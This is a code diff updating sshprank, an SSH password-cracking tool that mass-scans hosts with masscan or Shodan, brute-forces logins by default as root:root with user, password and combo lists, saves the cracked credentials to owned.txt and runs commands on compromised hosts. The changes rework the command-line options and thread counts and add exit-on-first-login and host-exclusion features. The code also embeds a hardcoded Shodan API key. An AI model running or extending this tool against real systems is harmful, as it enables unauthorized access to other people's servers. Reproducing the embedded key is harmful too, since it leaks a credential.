@@ -38,7 +38,7 @@ from collections import deque
 
 
 __author__ = 'noptrix'
-__version__ = '1.3.5'
+__version__ = '1.4.0'
 __copyright = 'santa clause'
 __license__ = 'MIT'
 
@@ -69,11 +69,9 @@ HELP = BOLD + '''usage''' + NORM + '''
 
 ''' + BOLD + '''modes''' + NORM + '''
 
-  -h <host:[ports]>     - single host to crack. multiple ports can be seperated
-                          by comma, e.g.: 22,2022,22222 (default port: 22)
-
-  -l <file>             - list of hosts to crack. format: <host>[:ports]. multiple
-                          ports can be seperated by comma (default port: 22)
+  -h <hosts[:ports]>    - single host or host list to crack. multiple ports
+                          can be separated by comma, e.g.: 127.0.0.1:22,222,2022
+                          (default port: 22)
 
   -m <opts> [-r <num>]  - pass arbitrary masscan opts, portscan given hosts and
                           crack for logins. found sshd services will be saved to
@@ -93,30 +91,29 @@ HELP = BOLD + '''usage''' + NORM + '''
 
   -b <file>             - list of hosts to grab sshd banner from
                           format: <host>[:ports]. multiple ports can be
-                          seperated by comma (default port: 22)
+                          separated by comma (default port: 22)
 
 ''' + BOLD + '''options''' + NORM + '''
 
   -r <num>              - generate <num> random ipv4 addresses, check for open
                           sshd port and crack for login (only with -m option!)
-  -c <file|cmd>         - read commands from file (line by line) or execute a
+  -u <user|file>        - single username or user list (default: root)
+  -p <pass|file>        - single password or password list (default: root)
+  -c <file>             - list of user:pass combination
+  -C <cmd|file>         - read commands from file (line by line) or execute a
                           single command on host if login was cracked
   -N                    - do not output ssh command results
-  -u <user>             - single username (default: root)
-  -U <file>             - list of usernames
-  -p                    - single password (default: root)
-  -P <file>             - list of passwords
-  -C <file>             - list of user:pass combination
-  -x <num>              - num threads for parallel host crack (default: 30)
-  -S <num>              - num threads for parallel service crack (default: 10)
-  -X <num>              - num threads for parallel login crack (default: 20)
+  -x <num>              - num threads for parallel host crack (default: 50)
+  -S <num>              - num threads for parallel service crack (default: 20)
+  -X <num>              - num threads for parallel login crack (default: 5)
   -B <num>              - num threads for parallel banner grabbing (default: 70)
   -T <sec>              - num sec for auth and connect timeout (default: 5s)
   -R <sec>              - num sec for (banner) read timeout (default: 3s)
   -o <file>             - write found logins to file. format:
                           <host>:<port>:<user>:<pass> (default: owned.txt)
-  -e                    - exit after first login was found. continue with other
-                          hosts instead (default: off)
+  -e                    - exclude host after first login was found. continue
+                          with other hosts instead
+  -E                    - exit sshprank completely after first login was found
   -v                    - verbose mode. show found logins, sshds, etc.
                           (default: off)
 
@@ -128,7 +125,7 @@ HELP = BOLD + '''usage''' + NORM + '''
 ''' + BOLD + '''examples''' + NORM + '''
 
   # crack targets from a given list with user admin, pw-list and 20 host-threads
-  $ sshprank -l sshds.txt -u admin -P /tmp/passlist.txt -x 20
+  $ sshprank -h sshds.txt -u admin -P /tmp/passlist.txt -x 20
 
   # first scan then crack from founds ssh services using 'root:admin'
   $ sudo sshprank -m '-p22,2022 --rate 5000 --source-ip 192.168.13.37 \\
@@ -150,23 +147,25 @@ stargets = []   # shodan
 excluded = {}
 opts = {
   'targets': [],
+  'targetlist': [],
   'masscan_opts': '--open ',
   'sho_opts': None,
   'sho_str': None,
   'sho_page': None,
   'sho_lim': None,
   'sho_key': 'Pp1oDSiavzKQJSsRgdzuxFJs8PQXzBL9',
-  'cmd': None,
-  'cmd_no_out': False,
   'user': 'root',
   'pass': 'root',
-  'hthreads': 30,
-  'sthreads': 10,
-  'lthreads': 20,
+  'cmd': None,
+  'cmd_no_out': False,
+  'hthreads': 50,
+  'sthreads': 20,
+  'lthreads': 5,
   'bthreads': 70,
   'ctimeout': 5,
   'rtimeout': 3,
   'logfile': 'owned.txt',
+  'exclude': False,
   'exit': False,
   'verbose': False
 }
@@ -222,13 +221,13 @@ def parse_target(target):
   return dtarget
 
 
-def read_list(_file):
+def read_file(_file):
   try:
     with open(_file, 'r', encoding='latin-1') as f:
       with mmap.mmap(f.fileno(), length=0, access=mmap.ACCESS_READ) as m:
         return m.read().decode('latin-1').split()
   except:
-    log(f'could not read wordlist {_file}', 'error')
+    log(f'could not read from {_file}', 'error')
 
 
 def parse_cmdline(cmdline):
@@ -236,12 +235,13 @@ def parse_cmdline(cmdline):
 
   try:
     _opts, _args = getopt.getopt(cmdline,
-      'h:l:m:s:b:r:c:N:u:U:p:P:C:x:S:X:B:T:R:o:evVH')
+      'h:m:s:b:r:u:p:c:C:Nx:S:X:B:T:R:o:eEvVH')
     for o, a in _opts:
       if o == '-h':
-        opts['targets'] = parse_target(a)
-      if o == '-l':
-        opts['targetlist'] = a
+        if os.path.isfile(a):
+          opts['targetlist'] = a
+        else:
+          opts['targets'] = parse_target(a)
       if o == '-m':
         opts['masscan_opts'] += a
       if o == '-s':
@@ -250,20 +250,22 @@ def parse_cmdline(cmdline):
         opts['targetlist'] = a
       if o == '-r':
         opts['random'] = int(a)
+      if o == '-u':
+        if os.path.isfile(a):
+          opts['userlist'] = read_file(a)
+        else:
+          opts['user'] = a
+      if o == '-p':
+        if os.path.isfile(a):
+          opts['passlist'] = read_file(a)
+        else:
+          opts['pass'] = a
       if o == '-c':
+        opts['combolist'] = read_file(a)
+      if o == '-C':
         opts['cmd'] = a
       if o == '-N':
         opts['cmd_no_out'] = True
-      if o == '-u':
-        opts['user'] = a
-      if o == '-U':
-        opts['userlist'] = read_list(a)
-      if o == '-p':
-        opts['pass'] = a
-      if o == '-P':
-        opts['passlist'] = read_list(a)
-      if o == '-C':
-        opts['combolist'] = read_list(a)
       if o == '-x':
         opts['hthreads'] = int(a)
       if o == '-S':
@@ -279,6 +281,8 @@ def parse_cmdline(cmdline):
       if o == '-o':
         opts['logfile'] = a
       if o == '-e':
+        opts['exclude'] = True
+      if o == '-E':
         opts['exit'] = True
       if o == '-v':
         opts['verbose'] = True
@@ -296,25 +300,22 @@ def parse_cmdline(cmdline):
 
 def check_argv(cmdline):
   modes = False
-  needed = ['-h', '-l', '-m', '-s', '-b', '-H', '-V']
+  needed = ['-h', '-m', '-s', '-b', '-H', '-V']
 
   if set(needed).isdisjoint(set(cmdline)):
     log('wrong usage dude, check help', 'error')
 
   if '-h' in cmdline:
-    if '-l' in cmdline or '-m' in cmdline or '-s' in cmdline or '-b' in cmdline:
-      modes = True
-  if '-l' in cmdline:
-    if '-h' in cmdline or '-m' in cmdline or '-s' in cmdline or '-b' in cmdline:
+    if '-m' in cmdline or '-s' in cmdline or '-b' in cmdline:
       modes = True
   if '-m' in cmdline:
-    if '-h' in cmdline or '-l' in cmdline or '-s' in cmdline or '-b' in cmdline:
+    if '-h' in cmdline or '-s' in cmdline or '-b' in cmdline:
       modes = True
   if '-s' in cmdline:
-    if '-h' in cmdline or '-m' in cmdline or '-l' in cmdline or '-b' in cmdline:
+    if '-h' in cmdline or '-m' in cmdline or '-b' in cmdline:
       modes = True
   if '-b' in cmdline:
-    if '-h' in cmdline or '-l' in cmdline or '-m' in cmdline or '-s' in cmdline:
+    if '-h' in cmdline or '-m' in cmdline or '-s' in cmdline:
       modes = True
 
   if modes:
@@ -415,6 +416,8 @@ def crack_login(host, port, username, password):
         allow_agent=False, look_for_keys=False, auth_timeout=opts['ctimeout'])
       login = f'{host}:{port}:{username}:{password}'
       log_targets(f'{login}\n', opts['logfile'])
+      if opts['exclude']:
+        excluded[host].add(port)
       if opts['verbose']:
         log(f'found login: {login}', _type='good')
       else:
@@ -439,6 +442,9 @@ def crack_login(host, port, username, password):
             log(f"ssh command results for \'{opts['cmd'].rstrip()}\'", 'good')
             for line in stdout.readlines():
               log(line)
+      if opts['exit']:
+        log('game over', 'info')
+        os._exit(SUCCESS)
       return SUCCESS
   except paramiko.AuthenticationException as err:
     if opts['verbose']:
@@ -504,11 +510,10 @@ def run_threads(host, ports, val='single'):
           except IndexError:
             log('combo list format: <user>:<pass>', 'error')
 
-      # TODO
-      #if opts['exit']:
-      #  for x in as_completed(futures):
-      #    if x.result() == SUCCESS:
-      #      os._exit(SUCCESS)
+      if opts['exit']:
+        for x in as_completed(futures):
+          if x.result() == SUCCESS:
+            os._exit(SUCCESS)
 
   return
 
@@ -657,10 +662,10 @@ def main(cmdline):
 
   log('game started', 'info')
   try:
-    if '-h' in cmdline:
+    if not opts['targetlist']:
       log('cracking single target', 'info')
       crack_single()
-    elif '-l' in cmdline:
+    elif len(opts['targetlist']) > 0:
       with ThreadPoolExecutor(1) as e:
         future = e.submit(crack_multi)
         status(future, 'cracking multiple targets\r')
